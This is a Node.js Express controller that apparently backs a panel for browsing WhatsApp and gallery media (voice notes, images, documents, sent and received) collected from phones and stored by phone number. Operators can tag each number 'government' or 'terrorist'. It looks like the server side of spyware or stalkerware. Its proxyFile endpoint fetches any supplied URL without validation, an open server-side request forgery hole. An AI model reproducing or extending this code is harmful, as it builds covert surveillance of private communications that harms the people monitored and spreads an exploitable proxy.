const storage = require("../services/firebaseStorage");

// In-memory category store (persisted to Firestore)
let userCategories = {}; // { "+923...": "uncategorized" | "general" | "government" | "terrorist" }
let categoriesLoadedAt = 0;
const CATEGORIES_TTL = 30 * 1000; // Reload from Firestore every 30 seconds

// Load categories from Firestore (with short TTL so different serverless instances stay in sync)
async function loadCategories() {
  if (Date.now() - categoriesLoadedAt < CATEGORIES_TTL) return;
  try {
    const { getFirestore } = require("../config/firebase");
    const db = getFirestore();
    const snap = await db.collection("userCategories").get();
    const fresh = {};
    snap.forEach((doc) => { fresh[doc.id] = doc.data().category || "uncategorized"; });
    userCategories = fresh;
  } catch (e) { console.log("Categories: using in-memory fallback"); }
  categoriesLoadedAt = Date.now();
}

async function saveCategory(phone, category) {
  userCategories[phone] = category;
  try {
    const { getFirestore } = require("../config/firebase");
    const db = getFirestore();
    await db.collection("userCategories").doc(phone).set({ category, updatedAt: new Date().toISOString() });
  } catch (e) { console.error("Failed to save category to Firestore:", e.message); }
  // Force reload on next request so change is immediately visible
  categoriesLoadedAt = 0;
}

// Cache users list for 5 minutes
let cachedUsers = null;
let cacheTime = 0;
const CACHE_TTL = 5 * 60 * 1000;

const getAll = async (req, res) => {
  try {
    await loadCategories();
    const { search, page = 1, limit = 50, category } = req.query;

    if (!cachedUsers || Date.now() - cacheTime > CACHE_TTL) {
      const phoneNumbers = await storage.discoverAllUsers();
      cachedUsers = phoneNumbers.map((phone) => ({
        _id: phone,
        userId: phone,
        phone: phone,
        displayName: phone,
        category: userCategories[phone] || "uncategorized",
      }));
      cacheTime = Date.now();
    }

    let users = cachedUsers.map((u) => ({
      ...u,
      category: userCategories[u.phone] || "uncategorized",
    }));

    // Filter by category
    if (category && category !== "all") {
      users = users.filter((u) => u.category === category);
    }

    // Search filter
    if (search) {
      const q = search.toLowerCase();
      users = users.filter((u) => u.phone.includes(q) || u.displayName.toLowerCase().includes(q));
    }

    const total = users.length;
    const pageNum = Number(page);
    const limitNum = Number(limit);
    const paged = users.slice((pageNum - 1) * limitNum, pageNum * limitNum);

    // Category counts
    const allUsers = cachedUsers.map((u) => ({ ...u, category: userCategories[u.phone] || "uncategorized" }));
    const categoryCounts = {
      all: allUsers.length,
      uncategorized: allUsers.filter((u) => u.category === "uncategorized").length,
      general: allUsers.filter((u) => u.category === "general").length,
      government: allUsers.filter((u) => u.category === "government").length,
      terrorist: allUsers.filter((u) => u.category === "terrorist").length,
    };

    res.json({ success: true, users: paged, total, page: pageNum, totalPages: Math.ceil(total / limitNum), categoryCounts });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

const getById = async (req, res) => {
  try {
    await loadCategories();
    const phone = req.params.id;
    const stats = await storage.getUserStats(phone);

    const user = {
      _id: phone,
      userId: phone,
      phone: phone,
      displayName: phone,
      category: userCategories[phone] || "uncategorized",
      apps: stats.apps,
      stats: {
        voiceNotes: stats.voiceNotes,
        images: stats.images,
        videos: stats.videos,
        documents: stats.documents,
        audio: stats.audio,
        gallery: stats.gallery,
        totalFiles: stats.totalFiles,
      },
    };

    res.json({ success: true, user });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get user's app folders (WhatsApp, BusinessWhatsApp, gallery)
const getUserApps = async (req, res) => {
  try {
    const phone = req.params.id;
    const apps = await storage.getUserApps(phone);
    res.json({ success: true, phone, apps });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get categories inside an app (voiceNotes, documents, images, audio, video)
const getAppCategories = async (req, res) => {
  try {
    const phone = req.params.id;
    const app = req.params.app;
    const categories = await storage.getAppCategories(phone, app);
    res.json({ success: true, phone, app, categories });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get files for a specific category (with optional direction: Sent/Received)
const getCategoryFiles = async (req, res) => {
  try {
    const phone = req.params.id;
    const app = req.params.app;
    const category = req.params.category;
    const direction = req.query.direction || "all";

    const files = await storage.getUserCategoryFiles(phone, app, category, direction);
    const directions = await storage.getCategoryDirections(phone, app, category);

    res.json({ success: true, phone, app, category, direction, directions, files, total: files.length });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get all files for a user
const getUserAllFiles = async (req, res) => {
  try {
    const phone = req.params.id;
    const data = await storage.getUserAllFiles(phone);

    res.json({
      success: true,
      phone,
      ...data,
      stats: {
        voiceNotes: data.voiceNotes.length,
        images: data.images.length,
        videos: data.videos.length,
        documents: data.documents.length,
        audio: data.audio.length,
        gallery: data.gallery.length,
      },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Set user category
const setUserCategory = async (req, res) => {
  try {
    const phone = req.params.id;
    const { category } = req.body;
    const validCategories = ["uncategorized", "general", "government", "terrorist"];
    if (!validCategories.includes(category)) {
      return res.status(400).json({ success: false, message: `Invalid category. Use: ${validCategories.join(", ")}` });
    }
    await saveCategory(phone, category);
    // Invalidate cache so next getAll picks up the change
    cachedUsers = null;
    res.json({ success: true, phone, category });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Storage overview
const getStorageOverview = async (req, res) => {
  try {
    const overview = await storage.getStorageOverview();
    res.json({ success: true, ...overview });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Browse a storage path
const browsePath = async (req, res) => {
  try {
    const prefix = req.query.path || "";
    const prefixes = await storage.listPrefixes(prefix);
    const files = await storage.listFiles(prefix, 100);

    res.json({
      success: true,
      path: prefix,
      folders: prefixes.map((f) => ({ name: f.replace(prefix, "").replace(/\/$/, ""), fullPath: f })),
      files,
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Proxy a single file download (bypasses CORS for frontend zip creation)
const proxyFile = async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ success: false, message: "url param required" });

  try {
    const https = require("https");
    const http = require("http");
    const parsedUrl = new URL(url);
    const client = parsedUrl.protocol === "https:" ? https : http;

    client.get(url, { timeout: 30000 }, (upstream) => {
      if (upstream.statusCode !== 200) {
        return res.status(upstream.statusCode || 500).json({ success: false, message: "File fetch failed" });
      }
      // Forward content headers
      if (upstream.headers["content-type"]) res.setHeader("Content-Type", upstream.headers["content-type"]);
      if (upstream.headers["content-length"]) res.setHeader("Content-Length", upstream.headers["content-length"]);
      res.setHeader("Cache-Control", "public, max-age=3600");
      upstream.pipe(res);
    }).on("error", (err) => {
      console.error("Proxy error:", err.message);
      if (!res.headersSent) res.status(500).json({ success: false, message: err.message });
    });
  } catch (err) {
    if (!res.headersSent) res.status(500).json({ success: false, message: err.message });
  }
};

module.exports = {
  getAll,
  getById,
  getUserApps,
  getAppCategories,
  getCategoryFiles,
  getUserAllFiles,
  setUserCategory,
  getStorageOverview,
  browsePath,
  proxyFile,
};
